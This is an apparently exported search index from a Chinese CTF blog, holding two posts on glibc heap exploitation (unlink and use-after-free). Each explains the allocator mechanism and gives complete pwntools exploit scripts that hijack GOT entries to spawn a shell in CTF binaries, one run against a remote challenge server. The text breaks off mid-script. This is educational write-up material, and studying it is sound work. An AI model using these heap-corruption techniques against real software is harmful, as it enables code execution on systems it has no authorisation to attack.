<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Unlink</title>
    <url>/2021/10/04/Unlink/</url>
    <content><![CDATA[<h1>Unlink</h1>
<h2 id="原理介绍"><a class="header-anchor" href="#原理介绍">¶</a>原理介绍</h2>
<h3 id="unlink"><a class="header-anchor" href="#unlink">¶</a>unlink</h3>
<p>unlink其实进行脱链操作，下面贴一张CTF-wiki上的原理图</p>
<span id="more"></span>
<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
<p>一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来，<br>
然后和物理相邻的堆块合并成新的大堆块（向前合并/向后合并），最后再放入到<br>
unsortedbin中</p>
<h3 id="unlink-源码阅读"><a class="header-anchor" href="#unlink-源码阅读">¶</a>unlink 源码阅读</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在free当前堆块的是后，会先检查其物理相邻的前一个堆块是不是处于释放状态，如果处于free状态则进入判断</p>
<p>将首先会提取当前堆块的前一个堆块的大小</p>
<p>将当前堆块的size和前一个堆块的size相加，即合并</p>
<p>将当前堆块的指针指向前一个堆块</p>
<p>然后unlink，即将当前的P所指向的chunk从双链表中移除</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里会进行一个检查，判断FD的bk和BK的fd是否指向当前堆块</p>
<h3 id="Unlink-的绕过和利用"><a class="header-anchor" href="#Unlink-的绕过和利用">¶</a>Unlink 的绕过和利用</h3>
<p>step1:伪造fake chunk</p>
<pre><code>chunk = 0x0602040
P 为我们将要合并的地址,P存在于chunk中，且有*(chunk)=P
P-&gt;fd = chunk - 0x18 = 0x602028
P-&gt;bk = chunk - 0x10 = 0x602030
</code></pre>
<p>Step2: 绕过检查</p>
<pre><code>Unlink(P,BK,FD)&#123;
    FD = P-&gt;fd     // FD = 0x602028
    BK = P-&gt;bk     // BK = 0x602030
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
     // 检查绕过 FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
     //绕过2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
     FD-&gt;bk = BK //*(0x602040) = 0x602030
     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
    &#125;
&#125;
</code></pre>
<p>Step3: 劫持程序执行流</p>
<pre><code>经过上述的步骤，我们已经实现了在*(chunk)中写入了chunk-0x18的值
如过我向chunk - 0x18 写入__free_hook,在我下一次修改的时候就可以把__free_hook改写为system
</code></pre>
<h2 id="列题"><a class="header-anchor" href="#列题">¶</a>列题</h2>
<h3 id="ZJCTF-2019-EasyHeap"><a class="header-anchor" href="#ZJCTF-2019-EasyHeap">¶</a>ZJCTF 2019 EasyHeap</h3>
<p>这道题网上的wp大多都是house of spirit 以及 Unsorted bin attack, 这里介绍一种Unlink的攻击方式</p>
<h4 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/be6e1prqqmpinvcx751v0xlp/39.png" alt="39.png-43.8kB"></p>
<p>可以看到add是用一个heaparray的数组来管理堆块的</p>
<p><img src="http://static.zybuluo.com/hgggg/ebbhnt7xr0p8sxtcrqky20zq/40.png" alt="40.png-19.9kB"></p>
<p>edit</p>
<p><img src="http://static.zybuluo.com/hgggg/icy3zhxsx8ifxfjuc1eezl92/41.png" alt="41.png-50.9kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/x6npivuk736g3yvmlb5dnw3k/42.png" alt="42.png-32kB"></p>
<p>同时该题也没开启PIE保护</p>
<p><img src="http://static.zybuluo.com/hgggg/ksgf2d6r9b7dr7d238ixo334/43.png" alt="43.png-23.7kB"></p>
<p>这题就非常适合利用Unlink手法来构造exp</p>
<h4 id="解题思路"><a class="header-anchor" href="#解题思路">¶</a>解题思路</h4>
<p>Step1:伪造fake chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>伪造后可以发现此时chunk0处于free状态</p>
<p><img src="http://static.zybuluo.com/hgggg/e5mmfpfyovlu8qpi6d4c8l4b/44.png" alt="44.png-21.6kB"></p>
<p>此时我们释放掉堆块1，可以发现堆块0和堆块1成功合并，触发Unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/toot7r72l7m2qjirr2sj3sue/45.png" alt="45.png-77.3kB"></p>
<p>Step2：任意地址写</p>
<p>可以看到chunk0已经指向了0x6020c8,我们可以通过edit(0)为system最后getshell</p>
<p><img src="http://static.zybuluo.com/hgggg/5w8ayit4cce7b0if21xr16st/46.png" alt="46.png-38.3kB"></p>
<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;easyheap&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(system)+p64(system)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="hitcon2014-stkof"><a class="header-anchor" href="#hitcon2014-stkof">¶</a>hitcon2014_stkof</h3>
<h4 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h4>
<p>本题和上一题区别不大，唯一的区别就在于本题没有调用system函数，需要泄露libc地址</p>
<p>即把free_got 改为 puts_plt即可泄露地址</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF</title>
    <url>/2021/10/04/UAF/</url>
    <content><![CDATA[<h1>Use after free</h1>
<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
<pre><code>就是某块内存释放后，任能被用户使用，即存在野指针（一般是free后没有将指针置NULL）
</code></pre>
<span id="more"></span>
<h3 id="样例"><a class="header-anchor" href="#样例">¶</a>样例</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="malloc内存对齐"><a class="header-anchor" href="#malloc内存对齐">¶</a>malloc内存对齐</h3>
<p>在大多数情况下，编译器和C库透明地帮你处理对齐问题。POSIX 标明了通过malloc( ), calloc( ), 和 realloc( ) 返回的地址对于任何的C类型来说都是对齐的。这样可以避免内存中的碎片，提高程序效率。</p>
<p>来看下malloc.h的部分源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>翻译翻译就是malloc在对其的时侯，其对其参数必须是2的幂且在32为下8byte,64位下为16byte</p>
<p>但是最小分配单位并不是对齐单位，最小分配单位MINSIZE：</p>
<p>计算MINSIZE=（16+8-1） &amp; ~（8-1）=16字节</p>
<p>即32位下malloc的最小分配单位为16字节，64位下最小分配单位为32字节。</p>
<p>其中request2size就是malloc的内存对齐操作。</p>
<p>从request2size还可以知道，如果是64位系统，申请内存为1~24字节时，系统内存消耗32字节，当申请内存为25字节时，系统内存消耗48字节。 如果是32位系统，申请内存为1~12字节时，系统内存消耗16字节，当申请内存为13字节时，系统内存消耗24字节。（类似计算MINSIZE）</p>
<h3 id="UAF-的利用"><a class="header-anchor" href="#UAF-的利用">¶</a>UAF 的利用</h3>
<p>当申请两个fastbin范围内的堆块后，fastbin如下图所示</p>
<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
<p>此时可以利用UAF修改chunk0的指针，当我们再次申请出这两个堆的时候，就可以申请到想要修改的地址处,进行后续的一些修改</p>
<h3 id="double-free"><a class="header-anchor" href="#double-free">¶</a>double free</h3>
<p>double free 和 UAF 一样同样也是由于指针为清空造成的漏洞，与UAF的漏洞利用方式差不多，常被用于与fastbin attack 组合利用</p>
<p>下面介绍一种利用double free 来达到任意地址写的利用方式</p>
<p>当申请两个堆块并且释放时fastbin中有如下结构：</p>
<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
</code></pre>
<p>而此时我们再次释放chunk1</p>
<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
</code></pre>
<p>如果我们此时申请一个新的chunk</p>
<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
<p>此时修改new chunk的指针</p>
<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
<p>再申请一个chunk1</p>
<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
<p>在申请一个chunk后这个chunk就会合chunk1重合，且fastbin链表已经指向了我们想要修改的地址了，只要再申请一个堆块就会申请到想要修改的地址，然后只要编辑这个堆块便可完成任意地址写。</p>
<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
<h3 id="hacknote"><a class="header-anchor" href="#hacknote">¶</a>hacknote</h3>
<h4 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h4>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
<p>delete<br>
<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
<h4 id="利用思路"><a class="header-anchor" href="#利用思路">¶</a>利用思路</h4>
<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
<p>由上图可以看到，当我们申请一个note的时候，此时堆块的结构如下图所示</p>
<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
<p>具体利用方式如下</p>
<p>我们申请两个note,在进行释放</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
<p>此时struct note被放到fastbin[0] , content 被放入fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
<p>如果我们申请一个大小在fastbin[0]范围内的堆note2,那么note2 的struct note 和 content就会分别是fastbin[0]中的note1,和note0的struct note</p>
<p>因此新建的note2的strcut note将被分配到note1的结构体位置，note2的content将被分配到note0的结构体位置，note0八字节的结构体处分别存放了打印函数0x804862b和其参数地址，现在将被我们输入的content覆盖</p>
<p>如果我们将content 覆盖为 __libc_start_main的地址 那么我们就可以泄露 libc 了 , 同理可以梅开二度getshell</p>
<p>这里还有一个小坑，覆盖后system的参数实际上是从note0结构体开始的，所以要用到system参数截断的姿势，如：&amp;&amp;sh，||sh，;sh;</p>
<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
<p>可以看到最后成功调用了system(‘sh’)</p>
<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span 